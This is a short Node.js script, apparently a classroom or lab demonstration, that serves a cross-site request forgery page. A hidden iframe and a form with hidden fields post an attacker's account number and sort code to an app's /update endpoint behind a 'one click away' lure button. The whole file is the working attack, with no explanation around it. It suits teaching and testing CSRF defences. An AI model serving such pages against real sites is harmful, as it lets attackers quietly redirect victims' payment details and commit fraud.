const http = require('http')

const attackerAc = '87654321'
const attackerSc = '11-11-11'
const attackerMsg = 'Everything you could ever want is only one click away'

const server = http.createServer((req, res) => {
  res.writeHead(200, {'Content-Type': 'text/html'})
  res.end(`
    <iframe name=hide style="position:absolute;left:-1000px"></iframe>
    <form method="post" action="http://app.local/update" target=hide>
      <input type=hidden name=sc value="${attackerAc}">
      <input type=hidden name=ac value="${attackerSc}">
      <input type=submit value="${attackerMsg}">
    </form>
  `)
})

server.listen(3001)